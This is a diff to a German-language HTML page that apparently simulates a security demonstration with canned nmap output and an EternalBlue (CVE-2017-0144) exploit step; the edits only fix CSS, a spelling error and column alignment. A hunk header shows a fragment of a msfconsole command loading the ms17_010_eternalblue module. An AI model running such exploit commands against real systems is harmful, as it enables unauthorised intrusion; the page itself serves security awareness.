@@ -38,6 +38,7 @@
       overflow-y: auto;
       margin-bottom: 20px;
       box-shadow: inset 0 2px 8px rgba(0,0,0,0.5);
+      white-space: pre-wrap; /* Wichtige Änderung: Zeilenumbrüche beibehalten */
     }
     .btn {
       display: inline-block;
@@ -94,7 +95,7 @@
       Angreifer ungepatchte Systeme ausnutzen können. Die Simulation wird dabei in drei Schritten durchgeführt:
     </p>
     <ol>
-      <li>Ein erweiteter Netzwerkscan, um potenziell gefährdete Systeme im Netzwerk zu identifizieren.</li>
+      <li>Ein erweiterter Netzwerkscan, um potenziell gefährdete Systeme im Netzwerk zu identifizieren.</li>
       <li>Ein Exploit, der die Schwachstelle eines ungepatchten Systems ausnutzt.</li>
       <li>Eine Demonstration, wie Angreifer Zugriff auf sensible Daten erlangen könnten.</li>
     </ol>
@@ -155,10 +156,10 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1
 Nmap Scan Report for 192.168.1.10
 Host is up (0.0012s latency).
 Not shown: 997 closed ports
-PORT     STATE SERVICE
-80/tcp   open  http
-443/tcp  open  https
-3389/tcp open  ms-wbt-server
+PORT      STATE SERVICE
+80/tcp    open  http
+443/tcp   open  https
+3389/tcp  open  ms-wbt-server
 -------------------------------------------------
 OS Details: Windows 10 Pro, fully patched.
           `.trim() + "\n\n";
@@ -167,10 +168,10 @@ OS Details: Windows 10 Pro, fully patched.
 Nmap Scan Report for 192.168.1.20
 Host is up (0.0023s latency).
 Not shown: 995 closed ports
-PORT     STATE SERVICE
-80/tcp   open  http
-445/tcp  open  microsoft-ds (SMB)
-3389/tcp open  ms-wbt-server
+PORT      STATE SERVICE
+80/tcp    open  http
+445/tcp   open  microsoft-ds (SMB)
+3389/tcp  open  ms-wbt-server
 -------------------------------------------------
 OS Details: Windows 7 SP1, unpatched.
 Vulnerability: CVE-2017-0144 (EternalBlue) detected via smb-vuln-ms17-010 script.
@@ -216,5 +217,6 @@ Vulnerability: CVE-2017-0144 (EternalBlue) detected via smb-vuln-ms17-010 script
   </script>
 </body>
 </html>
+
 
 
